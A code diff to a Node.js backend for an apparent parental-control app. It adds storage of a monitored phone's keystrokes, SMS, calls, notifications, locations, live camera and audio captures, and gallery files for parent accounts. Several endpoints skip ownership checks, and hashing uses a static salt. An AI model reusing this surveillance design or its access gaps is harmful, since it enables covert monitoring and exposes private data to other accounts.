@@ -25,14 +25,22 @@ function load() {
     parents: [], devices: [], alerts: [], rules: [], usage: [], locations: [], calls: [], sms: [], contacts: [],
     keystrokes: [], browsing: [], websiteRules: [], privacy: [], media: [], commands: [], driving: [], sos: [],
     imageFlags: [], activity: [], appHealth: [], dataUsage: [], downtime: [], geofences: [],
-    gallery: [], filesIndex: [], fileBrowse: {}, fileDownloads: {}
+    gallery: [], filesIndex: [], fileBrowse: {}, fileDownloads: {}, remoteUploads: {}, remoteLatest: {}, notifications: [], invites: [], reports: [], parentPins: {}
   };
   for (const k of Object.keys(defaults)) {
     if (db[k] === undefined || db[k] === null) db[k] = defaults[k];
   }
   return db;
 }
-function save(db) { fs.writeFileSync(DB_FILE, JSON.stringify(db)); }
+function save(db) {
+  try {
+    const tmp = DB_FILE + '.tmp';
+    fs.writeFileSync(tmp, JSON.stringify(db));
+    fs.renameSync(tmp, DB_FILE);
+  } catch (e) {
+    try { fs.writeFileSync(DB_FILE, JSON.stringify(db)); } catch (e2) { console.error('save failed', e2); }
+  }
+}
 function rid() { return crypto.randomBytes(8).toString('hex'); }
 function token() { return crypto.randomBytes(24).toString('hex'); }
 function hash(p) { return crypto.createHash('sha256').update(String(p) + 'pc-salt-v1').digest('hex'); }
@@ -206,7 +214,15 @@ const server = http.createServer(async (req, res) => {
     if (pathname === '/devices' && req.method === 'GET') {
       const p = parentOf(body, q, req.headers);
       if (!p) return send(res, 401, { error: 'unauthorized' });
-      return send(res, 200, { devices: load().devices.filter(d => d.parentId === p.id).map(d => ({
+      const db = load();
+      const parentIds = new Set([p.id]);
+      if (p.linkedParentId) parentIds.add(p.linkedParentId);
+      db.parents.forEach(x => {
+        if (x.linkedParentId === p.id) parentIds.add(x.id);
+        if (p.linkedParentId && x.id === p.linkedParentId) parentIds.add(x.id);
+        if (p.familyCode && x.familyCode === p.familyCode) parentIds.add(x.id);
+      });
+      return send(res, 200, { devices: db.devices.filter(d => parentIds.has(d.parentId)).map(d => ({
         deviceId: d.deviceId,
         name: d.name,
         childName: d.name,
@@ -253,14 +269,227 @@ const server = http.createServer(async (req, res) => {
     if (pathname === '/location/update' && req.method === 'POST') {
       const d = childOf(body, q, req.headers);
       if (!d) return send(res, 401, { error: 'unauthorized' });
-      const lat = body.latitude ?? body.lat;
-      const lon = body.longitude ?? body.lon;
+      const lat = Number(body.latitude ?? body.lat);
+      const lon = Number(body.longitude ?? body.lon);
+      if (isNaN(lat) || isNaN(lon)) return send(res, 400, { error: 'invalid lat/lon' });
+      const acc = Number(body.accuracy || 0) || 0;
       const db = load();
       const x = db.devices.find(a => a.deviceId === d.deviceId);
-      if (x && lat != null) { x.lat = lat; x.lon = lon; x.lastSeen = now(); x.online = 1; }
-      db.locations.push({ id: rid(), deviceId: d.deviceId, lat, lon, accuracy: body.accuracy || 0, createdAt: now() });
+      if (x) {
+        x.lat = lat; x.lon = lon; x.locationAccuracy = acc;
+        x.locationUpdatedAt = now(); x.lastSeen = now(); x.online = 1;
+      }
+      const row = {
+        id: rid(), deviceId: d.deviceId,
+        lat, lon, latitude: lat, longitude: lon,
+        accuracy: acc, provider: body.provider || '',
+        createdAt: now(), createdMs: Date.now()
+      };
+      db.locations.push(row);
+      // keep last 60 points per device
+      const mine = db.locations.filter(l => l.deviceId === d.deviceId);
+      if (mine.length > 60) {
+        const drop = new Set(mine.slice(0, mine.length - 60).map(l => l.id));
+        db.locations = db.locations.filter(l => l.deviceId !== d.deviceId || !drop.has(l.id));
+      }
+      save(db);
+      return send(res, 200, { ok: true, lat, lon });
+    }
+
+    if ((pathname === '/location' || pathname === '/location/latest' || pathname === '/locations') && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = q.deviceId || body.deviceId;
+      if (!deviceId) return send(res, 400, { error: 'deviceId required' });
+      const db = load();
+      const list = db.locations
+        .filter(l => l.deviceId === deviceId)
+        .slice()
+        .sort((a, b) => (b.createdMs || 0) - (a.createdMs || 0) || String(b.createdAt).localeCompare(String(a.createdAt)));
+      const mapped = list.slice(0, 30).map(l => ({
+        id: l.id,
+        lat: l.lat ?? l.latitude,
+        lon: l.lon ?? l.longitude,
+        latitude: l.lat ?? l.latitude,
+        longitude: l.lon ?? l.longitude,
+        accuracy: l.accuracy || 0,
+        provider: l.provider || '',
+        createdAt: l.createdAt,
+        createdMs: l.createdMs || 0
+      }));
+      const latest = mapped[0] || null;
+      // fallback to device last known
+      if (!latest) {
+        const x = db.devices.find(d => d.deviceId === deviceId);
+        if (x && x.lat != null && x.lon != null) {
+          const fb = {
+            lat: x.lat, lon: x.lon, latitude: x.lat, longitude: x.lon,
+            accuracy: x.locationAccuracy || 0, createdAt: x.locationUpdatedAt || x.lastSeen || null
+          };
+          return send(res, 200, { ok: true, location: fb, locations: [fb], latest: fb });
+        }
+      }
+      return send(res, 200, { ok: true, location: latest, locations: mapped, latest });
+    }
+
+    if (pathname === '/location/history' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = q.deviceId || body.deviceId;
+      if (!deviceId) return send(res, 400, { error: 'deviceId required' });
+      const days = Math.min(30, Math.max(1, parseInt(q.days || '7', 10) || 7));
+      const cutoff = Date.now() - days * 24 * 60 * 60 * 1000;
+      const db = load();
+      let list = (db.locations || []).filter(l => l.deviceId === deviceId);
+      list = list.filter(l => {
+        const ms = l.createdMs || Date.parse(l.createdAt || '') || 0;
+        return ms >= cutoff;
+      });
+      list.sort((a, b) => (a.createdMs || 0) - (b.createdMs || 0));
+      const points = list.map(l => ({
+        lat: l.lat ?? l.latitude,
+        lon: l.lon ?? l.longitude,
+        latitude: l.lat ?? l.latitude,
+        longitude: l.lon ?? l.longitude,
+        accuracy: l.accuracy || 0,
+        createdAt: l.createdAt,
+        createdMs: l.createdMs || 0
+      }));
+      return send(res, 200, { ok: true, days, count: points.length, points, locations: points });
+    }
+
+
+    if ((pathname === '/events/notification' || pathname === '/notifications/push') && req.method === 'POST') {
+      const d = childOf(body, q, req.headers);
+      if (!d) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      if (!db.notifications) db.notifications = [];
+      db.notifications.push({
+        id: rid(), deviceId: d.deviceId, parentId: d.parentId,
+        packageName: body.packageName || '', title: body.title || '',
+        text: body.text || body.body || '', when: body.when || Date.now(),
+        key: body.key || '', createdAt: now()
+      });
+      const mine = db.notifications.filter(n => n.deviceId === d.deviceId);
+      if (mine.length > 400) {
+        const drop = new Set(mine.slice(0, mine.length - 400).map(n => n.id));
+        db.notifications = db.notifications.filter(n => n.deviceId !== d.deviceId || !drop.has(n.id));
+      }
+      // also parent alert for quick poll
+      db.alerts.push({
+        id: rid(), deviceId: d.deviceId, parentId: d.parentId,
+        type: 'NOTIFICATION', message: (body.title || body.packageName || 'Notification') + ': ' + String(body.text || body.body || '').slice(0, 80),
+        createdAt: now()
+      });
       save(db);
       return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/family/invite' && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const code = String(Math.floor(100000 + Math.random() * 900000));
+      if (!db.invites) db.invites = [];
+      db.invites.push({ code, parentId: p.id, familyCode: p.familyCode || '', createdAt: now(), uses: 0 });
+      save(db);
+      return send(res, 200, { ok: true, inviteCode: code, familyCode: p.familyCode });
+    }
+
+    if (pathname === '/family/join' && req.method === 'POST') {
+      const db = load();
+      const email = String(body.email || '').trim().toLowerCase();
+      const password = String(body.password || '');
+      const inviteCode = String(body.inviteCode || body.code || '').trim();
+      const inv = (db.invites || []).find(i => i.code === inviteCode);
+      if (!inv) return send(res, 404, { error: 'invalid invite' });
+      let row = db.parents.find(x => x.email === email);
+      if (!row) {
+        if (password.length < 4) return send(res, 400, { error: 'password required' });
+        const st = token();
+        row = { id: rid(), email, passwordHash: hash(password), sessionToken: st, familyCode: inv.familyCode, linkedParentId: inv.parentId, createdAt: now() };
+        db.parents.push(row);
+      } else {
+        row.linkedParentId = inv.parentId;
+        row.familyCode = inv.familyCode;
+        row.sessionToken = token();
+      }
+      inv.uses = (inv.uses || 0) + 1;
+      // share devices: use linked parent id for device list
+      save(db);
+      return send(res, 200, { sessionToken: row.sessionToken, email: row.email, familyCode: row.familyCode, multiParent: true });
+    }
+
+    if (pathname === '/reports/weekly' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = q.deviceId;
+      const db = load();
+      const parentIds = new Set([p.id]);
+      db.parents.forEach(x => { if (x.linkedParentId === p.id || x.id === p.linkedParentId) parentIds.add(x.id); });
+      const devices = db.devices.filter(d => parentIds.has(d.parentId) || d.parentId === p.id);
+      const ids = deviceId ? [deviceId] : devices.map(d => d.deviceId);
+      const since = Date.now() - 7 * 24 * 3600 * 1000;
+      const inWeek = (iso, ms) => {
+        const t = ms || Date.parse(iso || '') || 0;
+        return t >= since;
+      };
+      const report = {
+        generatedAt: now(),
+        days: 7,
+        devices: ids.map(id => {
+          const calls = (db.calls || []).filter(c => c.deviceId === id && inWeek(c.createdAt, c.startedAt));
+          const sms = (db.sms || []).filter(c => c.deviceId === id && inWeek(c.createdAt));
+          const locs = (db.locations || []).filter(c => c.deviceId === id && inWeek(c.createdAt, c.createdMs));
+          const usage = (db.usage || []).filter(c => c.deviceId === id);
+          const notif = (db.notifications || []).filter(c => c.deviceId === id && inWeek(c.createdAt, c.when));
+          const driving = (db.driving || []).filter(c => c.deviceId === id && inWeek(c.createdAt));
+          const missed = calls.filter(c => String(c.direction).toUpperCase().indexOf('MISS') >= 0 || c.direction === '3' || c.direction === 3);
+          return {
+            deviceId: id,
+            name: (devices.find(d => d.deviceId === id) || {}).name || id,
+            calls: calls.length,
+            missedCalls: missed.length,
+            sms: sms.length,
+            locationPoints: locs.length,
+            notifications: notif.length,
+            drivingEvents: driving.length,
+            topApps: usage.slice().sort((a, b) => (b.seconds || 0) - (a.seconds || 0)).slice(0, 8)
+              .map(u => ({ packageName: u.packageName, seconds: u.seconds || 0, day: u.day }))
+          };
+        })
+      };
+      return send(res, 200, { ok: true, report });
+    }
+
+    if (pathname === '/parent/pin' && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const pin = String(body.pin || '');
+      if (!/^[0-9]{4,8}$/.test(pin)) return send(res, 400, { error: 'pin must be 4-8 digits' });
+      const db = load();
+      if (!db.parentPins) db.parentPins = {};
+      db.parentPins[p.id] = hash(pin);
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/parent/pin/verify' && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const pin = String(body.pin || '');
+      const db = load();
+      const want = (db.parentPins || {})[p.id];
+      if (!want) return send(res, 200, { ok: true, required: false });
+      return send(res, 200, { ok: hash(pin) === want, required: true });
+    }
+
+    if (pathname === '/parent/pin/status' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const required = !!(db.parentPins || {})[p.id];
+      return send(res, 200, { required });
     }
 
     if (pathname === '/child/settings' && req.method === 'GET') {
@@ -284,7 +513,7 @@ const server = http.createServer(async (req, res) => {
       '/browsing/history': 'browsing', '/driving': 'driving', '/activity': 'activity',
       '/locations': 'locations', '/rules': 'rules', '/website/rules': 'websiteRules',
       '/downtime': 'downtime', '/geofence': 'geofences', '/image-scan': 'imageFlags',
-      '/data-usage': 'dataUsage', '/sos': 'sos', '/alerts': 'alerts'
+      '/data-usage': 'dataUsage', '/sos': 'sos', '/alerts': 'alerts', '/notifications': 'notifications'
     };
     if (req.method === 'GET' && parentGetMap[pathname]) {
       const p = parentOf(body, q, req.headers);
@@ -302,10 +531,89 @@ const server = http.createServer(async (req, res) => {
 
     // Child POST logs
     const childPost = {
-      '/calls/sync': (db, d, b) => { (b.items || b.calls || []).forEach(c => db.calls.push({ id: rid(), deviceId: d.deviceId, number: c.number, direction: c.direction || c.type, duration: c.duration || 0, createdAt: c.date || now() })); },
-      '/sms/sync': (db, d, b) => { (b.items || b.messages || []).forEach(m => db.sms.push({ id: rid(), deviceId: d.deviceId, address: m.address, body: m.body, direction: m.direction || 'IN', createdAt: m.date || now() })); },
-      '/contacts/sync': (db, d, b) => { db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId); (b.items || b.contacts || []).forEach(c => db.contacts.push({ id: rid(), deviceId: d.deviceId, name: c.name, number: c.number })); },
-      '/keystrokes/log': (db, d, b) => { const items = b.items || [{ packageName: b.packageName, text: b.text }]; items.forEach(k => { if (k && k.text) db.keystrokes.push({ id: rid(), deviceId: d.deviceId, packageName: k.packageName || '', text: String(k.text).slice(0, 2000), createdAt: now() }); }); },
+      '/calls/sync': (db, d, b) => {
+        const items = b.items || b.calls || [];
+        items.forEach(c => {
+          const started = c.startedAt || c.date || c.createdAt || Date.now();
+          const createdAt = (typeof started === 'number')
+            ? new Date(started < 1e12 ? started * 1000 : started).toISOString()
+            : String(started);
+          const number = String(c.number || '');
+          const direction = String(c.direction || c.type || '');
+          const duration = Number(c.durationSeconds != null ? c.durationSeconds : (c.duration || 0)) || 0;
+          // dedupe same call
+          const exists = db.calls.some(x => x.deviceId === d.deviceId && x.number === number && String(x.direction) === direction && String(x.createdAt) === createdAt);
+          if (!exists) {
+            db.calls.push({
+              id: rid(), deviceId: d.deviceId, number, name: c.name || '',
+              direction, duration, durationSeconds: duration,
+              createdAt, startedAt: started
+            });
+          }
+        });
+        // keep last 500 per device
+        const mine = db.calls.filter(x => x.deviceId === d.deviceId);
+        if (mine.length > 500) {
+          const drop = new Set(mine.slice(0, mine.length - 500).map(x => x.id));
+          db.calls = db.calls.filter(x => x.deviceId !== d.deviceId || !drop.has(x.id));
+        }
+      },
+      '/sms/sync': (db, d, b) => {
+        const items = b.items || b.messages || b.sms || [];
+        items.forEach(m => {
+          const when = m.date || m.createdAt || Date.now();
+          const createdAt = (typeof when === 'number')
+            ? new Date(when < 1e12 ? when * 1000 : when).toISOString()
+            : String(when);
+          const address = String(m.address || m.number || '');
+          const body = String(m.body || m.message || '');
+          const direction = String(m.direction || m.type || 'IN');
+          const exists = db.sms.some(x => x.deviceId === d.deviceId && x.address === address && x.body === body && String(x.createdAt) === createdAt);
+          if (!exists) {
+            db.sms.push({ id: rid(), deviceId: d.deviceId, address, body, direction, createdAt });
+          }
+        });
+        const mine = db.sms.filter(x => x.deviceId === d.deviceId);
+        if (mine.length > 800) {
+          const drop = new Set(mine.slice(0, mine.length - 800).map(x => x.id));
+          db.sms = db.sms.filter(x => x.deviceId !== d.deviceId || !drop.has(x.id));
+        }
+      },
+      '/contacts/sync': (db, d, b) => {
+        db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId);
+        (b.items || b.contacts || []).forEach(c => {
+          let number = c.number || '';
+          if (!number && Array.isArray(c.phones) && c.phones[0]) {
+            number = typeof c.phones[0] === 'object' ? (c.phones[0].number || '') : String(c.phones[0]);
+          }
+          db.contacts.push({ id: rid(), deviceId: d.deviceId, name: c.name || '', number: String(number || '') });
+        });
+      },
+      '/keystrokes/log': (db, d, b) => {
+        const pushOne = (pkg, text, ts) => {
+          if (!text || !String(text).trim()) return;
+          db.keystrokes.push({
+            id: rid(), deviceId: d.deviceId,
+            packageName: pkg || '',
+            text: String(text).slice(0, 2000),
+            createdAt: ts || now()
+          });
+        };
+        if (Array.isArray(b.items)) {
+          b.items.forEach(k => { if (k) pushOne(k.packageName, k.text, k.createdAt); });
+        } else if (b.text) {
+          // Child sends batch lines: ts\tpkg\ttext
+          String(b.text).split(/\n/).forEach(line => {
+            const parts = line.split('\t');
+            if (parts.length >= 3) pushOne(parts[1], parts.slice(2).join('\t'), parts[0] ? new Date(Number(parts[0])||Date.now()).toISOString() : now());
+            else if (line.trim()) pushOne(b.packageName || '', line.trim(), now());
+          });
+        } else if (b.packageName) {
+          pushOne(b.packageName, b.text || '', now());
+        }
+        // keep last 2000 only
+        if (db.keystrokes.length > 2000) db.keystrokes = db.keystrokes.slice(-2000);
+      },
       '/browsing/log': (db, d, b) => { db.browsing.push({ id: rid(), deviceId: d.deviceId, url: b.url || '', createdAt: now() }); },
       '/activity/log': (db, d, b) => { db.activity.push({ id: rid(), deviceId: d.deviceId, event: b.event || '', detail: b.detail || '', createdAt: now() }); },
       '/driving/event': (db, d, b) => { db.driving.push({ id: rid(), deviceId: d.deviceId, speed: b.speed || 0, lat: b.lat || 0, lon: b.lon || 0, createdAt: now() }); if ((b.speed || 0) >= 25) db.alerts.push({ id: rid(), deviceId: d.deviceId, parentId: d.parentId, type: 'DRIVING', message: 'Driving ~' + b.speed, createdAt: now() }); },
@@ -386,9 +694,21 @@ const server = http.createServer(async (req, res) => {
       const db = load();
       // numeric id so Android optLong works
       const pid = Date.now() * 1000 + Math.floor(Math.random() * 1000);
-      const row = { id: pid, deviceId: body.deviceId, kind: body.kind || 'CAMERA_FRONT', status: 'PENDING', createdAt: now() };
+      const row = {
+        id: pid,
+        deviceId: body.deviceId,
+        kind: body.kind || 'CAMERA_FRONT',
+        status: 'PENDING',
+        durationSeconds: body.durationSeconds || 0,
+        createdAt: now()
+      };
       db.privacy.push(row); save(db);
-      return send(res, 200, { requestId: row.id, id: row.id, request: { id: row.id, kind: row.kind, status: row.status } });
+      return send(res, 200, {
+        ok: true,
+        requestId: row.id,
+        id: row.id,
+        request: { id: row.id, kind: row.kind, status: row.status }
+      });
     }
     if (pathname === '/privacy/pending' && req.method === 'GET') {
       const d = childOf(body, q, req.headers); if (!d) return send(res, 401, { error: 'unauthorized' });
@@ -422,13 +742,32 @@ const server = http.createServer(async (req, res) => {
       let filePath = null;
       if (b64 && String(b64).length > 100) {
         const buf = Buffer.from(String(b64).replace(/^data:[^;]+;base64,/, ''), 'base64');
-        filePath = path.join(MEDIA, d.deviceId + '_' + Date.now() + '_' + kind + '.jpg');
+        const ext = (String(kind).toUpperCase().indexOf('AUDIO') >= 0) ? '.m4a' : '.jpg';
+        filePath = path.join(MEDIA, d.deviceId + '_' + Date.now() + '_' + kind + ext);
         fs.writeFileSync(filePath, buf);
       }
       const db = load();
-      const row = { id: rid(), deviceId: d.deviceId, kind, requestId: body.requestId || 0, path: filePath, createdAt: now() };
+      const row = { id: rid(), deviceId: d.deviceId, kind, requestId: body.requestId || 0, path: filePath, createdAt: now(), createdMs: Date.now() };
       db.media.push(row);
-      if (body.requestId) { const pr = db.privacy.find(r => r.id === body.requestId); if (pr) pr.status = 'CONSUMED'; }
+      // LIVE sessions must stay APPROVED so Parent can keep polling frames
+      if (body.requestId) {
+        const pr = db.privacy.find(r => String(r.id) === String(body.requestId));
+        if (pr) {
+          const k = String(kind || '');
+          if (k.indexOf('LIVE_') === 0) {
+            pr.status = 'APPROVED';
+            pr.lastFrameAt = now();
+          } else {
+            pr.status = 'CONSUMED';
+          }
+        }
+      }
+      // keep last 40 media rows per device to avoid huge db
+      const byDev = db.media.filter(m => m.deviceId === d.deviceId);
+      if (byDev.length > 40) {
+        const drop = byDev.slice(0, byDev.length - 40);
+        db.media = db.media.filter(m => m.deviceId !== d.deviceId || !drop.find(x => x.id === m.id));
+      }
       save(db);
       return send(res, 200, { ok: true, mediaId: row.id });
     }
@@ -610,7 +949,115 @@ const server = http.createServer(async (req, res) => {
     }
 
 
-    return send(res, 404, { error: 'not found', path: pathname });
+    
+    // ===== Remote media (gallery photo open / file transfer) =====
+    if (pathname === '/remote-media/chunk' && req.method === 'POST') {
+      const d = childOf(body, q, req.headers); if (!d) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      if (!db.remoteUploads) db.remoteUploads = {};
+      const uploadId = body.uploadId || rid();
+      let up = db.remoteUploads[uploadId];
+      if (!up) {
+        up = { uploadId, deviceId: d.deviceId, kind: body.kind || 'photo', mediaId: body.mediaId || 0,
+          path: body.path || '', name: body.name || 'file', mime: body.mime || 'application/octet-stream',
+          total: body.total || 1, chunks: {}, createdAt: now() };
+        db.remoteUploads[uploadId] = up;
+      }
+      const idx = body.index != null ? body.index : 0;
+      up.chunks[idx] = body.data || '';
+      const got = Object.keys(up.chunks).length;
+      const total = up.total || 1;
+      if (got >= total) {
+        // assemble
+        let b64 = '';
+        for (let i = 0; i < total; i++) b64 += (up.chunks[i] || '');
+        try {
+          const buf = Buffer.from(b64, 'base64');
+          if (!fs.existsSync(MEDIA)) fs.mkdirSync(MEDIA, { recursive: true });
+          const filePath = path.join(MEDIA, d.deviceId + '_' + Date.now() + '_' + (up.name || 'file').replace(/[^\w.\-]/g, '_'));
+          fs.writeFileSync(filePath, buf);
+          const row = {
+            id: rid(), deviceId: d.deviceId, kind: String(up.kind || 'PHOTO').toUpperCase(),
+            mediaId: up.mediaId, name: up.name, mime: up.mime, path: filePath,
+            srcPath: up.path, createdAt: now(), size: buf.length
+          };
+          db.media.push(row);
+          db.remoteLatest = db.remoteLatest || {};
+          db.remoteLatest[d.deviceId] = { id: row.id, name: row.name, kind: row.kind, mediaId: row.mediaId, path: row.path, mime: row.mime, size: row.size, createdAt: row.createdAt };
+          delete db.remoteUploads[uploadId];
+          save(db);
+          return send(res, 200, { ok: true, complete: true, mediaId: row.id });
+        } catch (e) {
+          save(db);
+          return send(res, 500, { error: 'assemble failed' });
+        }
+      }
+      save(db);
+      return send(res, 200, { ok: true, complete: false, got, total });
+    }
+    if (pathname === '/remote-media/latest' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const latest = (db.remoteLatest && db.remoteLatest[q.deviceId]) || null;
+      if (!latest) return send(res, 200, { item: null });
+      // optional filter by path or mediaId query
+      if (q.path && latest.srcPath && q.path !== latest.srcPath && q.path !== latest.path) {
+        // still return latest if recent
+      }
+      let data = null;
+      if (latest.path && fs.existsSync(latest.path)) {
+        const stt = fs.statSync(latest.path);
+        // only inline if under 6MB
+        if (stt.size <= 6 * 1024 * 1024) {
+          data = fs.readFileSync(latest.path).toString('base64');
+        }
+      }
+      return send(res, 200, {
+        item: {
+          id: latest.id, name: latest.name, kind: latest.kind, mime: latest.mime,
+          mediaId: latest.mediaId, size: latest.size, data: data,
+          filePath: latest.path, createdAt: latest.createdAt
+        }
+      });
+    }
+    if (pathname === '/remote-media/download' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const row = db.media.find(m => String(m.id) === String(q.id));
+      if (!row || !row.path || !fs.existsSync(row.path)) return send(res, 404, { error: 'not found' });
+      const buf = fs.readFileSync(row.path);
+      res.writeHead(200, {
+        'Content-Type': row.mime || 'application/octet-stream',
+        'Content-Length': buf.length,
+        'Access-Control-Allow-Origin': '*'
+      });
+      res.end(buf);
+      return;
+    }
+
+
+    // ---- Web Parent Dashboard (static) ----
+    if (pathname === '/' || pathname === '/web' || pathname === '/web/' || pathname === '/dashboard') {
+      const index = path.join(__dirname, 'web', 'index.html');
+      if (fs.existsSync(index)) {
+        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache' });
+        res.end(fs.readFileSync(index));
+        return;
+      }
+    }
+    if (pathname.startsWith('/web/')) {
+      const rel = pathname.replace(/^\/web\//, '').replace(/\.\./g, '');
+      const fp = path.join(__dirname, 'web', rel || 'index.html');
+      if (fs.existsSync(fp) && fs.statSync(fp).isFile()) {
+        const ext = path.extname(fp).toLowerCase();
+        const types = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.css': 'text/css', '.json': 'application/json', '.png': 'image/png', '.svg': 'image/svg+xml' };
+        res.writeHead(200, { 'Content-Type': types[ext] || 'application/octet-stream' });
+        res.end(fs.readFileSync(fp));
+        return;
+      }
+    }
+
+return send(res, 404, { error: 'not found', path: pathname });
   } catch (e) {
     console.error(e);
     return send(res, 500, { error: String(e.message || e) });
